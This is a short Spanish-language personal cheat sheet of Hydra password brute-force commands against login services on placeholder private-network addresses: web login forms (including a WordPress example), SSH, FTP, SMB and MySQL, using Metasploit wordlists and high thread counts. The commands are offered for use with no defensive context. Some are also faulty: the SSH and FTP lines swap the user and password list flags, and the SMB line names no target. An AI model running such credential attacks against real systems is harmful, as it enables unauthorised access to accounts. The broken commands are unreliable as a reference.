# Hydra Fuerza Bruta

Propietario: Adrian Gisbert Cabello

- Comando para HTTP-POST:
    
    `hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.X.X http-post-form 'URL:LOGIN_CAPTURADO_EN_BURPSUITE:MENSAJE_DE_ERROR' -t 64 -F`
    
    `hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.X.X http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' -t 64 -F`
    
    Los parámetros ***-t 64*** son los hilos que va a correr y ***-F*** es para que cuando encuentre una combinación válida, se detenga el ataque de fuerza bruta.
    
- Comando para ssh:
    
    `hydra -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt -L /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://192.168.X.X`
    
- Comando para FTP:
    
    `hydra -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt -L /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt [ftp://192.168.X.X](ftp://192.168.x.x/)`
    
- Comando para SMB:
    
    `hydra -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt`
    
- Comando para MySQL:
    
    `hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://192.168.X.X`
